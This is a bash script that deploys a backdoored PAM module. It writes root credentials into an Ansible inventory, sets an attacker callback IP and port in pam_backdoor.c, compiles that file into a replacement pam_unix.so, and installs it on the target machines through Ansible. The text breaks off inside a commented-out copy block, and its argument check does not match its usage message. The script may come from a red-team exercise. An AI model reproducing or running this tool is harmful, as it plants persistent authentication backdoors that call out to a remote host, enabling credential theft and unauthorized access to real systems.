#!/bin/bash

# Quit is user is not running script as root
if [ "$EUID" -ne 0 ]; then
    echo "Script must be run as root!"
    exit 1
fi

# Quit if correct arguments are not passed
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <Callback IP> <Callback Port>"
    exit 1
fi

ip=$2
port=$3

# ensure prereqs are installed
# ubuntu: libpam-modules libpam0g-dev
# rhel: pam-devel

# Get username and password for ansible
read -p "Enter username of user with root access on the target machines: " user
read -p "Enter password of this user: " pass

# Set this username and password in inventory
sed -i "s/^ansible_user.*/ansible_user=$user/" ./inventory.ini
sed -i "s/^ansible_password.*/ansible_password=$pass/" ./inventory.ini
sed -i "s/^ansible_become_password.*/ansible_become_password=$pass/" ./inventory.ini

# Install prereqs using ansible
ansible-playbook main.yml -t initial

# Change pam_backdoor.c to match callback IP and Port
sed -i "s/^#define CALLBACK_IP.*/#define CALLBACK_IP \"$ip\"/" ./pam_backdoor.c
sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT $port/" ./pam_backdoor.c

# Compile pam_backdoor.c into pam_unix.so
# Syntax :
# -fPIC: emit postition-independent code (suitable for dynamic linking)
# -shared: used with -fPIC, produce a shared object that can be linked with other objects to form an executable
# -l***: Link libpam.so and libdl.so
gcc -fPIC -shared -o pam_unix.so pam_backdoor.c -lpam -ldl

# Run ansible playbook to setup
ansible-playbook main.yml -t install

# get OS version
# os_version=$(cat /etc/*-release | grep "PRETTY_NAME" | sed 's/PRETTY_NAME=//g')
# version_number=0

# if [[ $os_version == *"Ubuntu"* ]]; then
#     version_number=1
# fi

# if [[ $os_version == *"Rocky"* || $os_version == *"Fedora"* ]]; then
#     version_number=2
# fi

# # Backup old pam_unix.so
# cp /lib/x86_64-linux-gnu/security/pam_unix.so /lib/pam.d/pam_unix.so

# # Copy over new pam_unix.so
# if [[ $version_number -eq 1 ]]; then
#     cp 

    
    

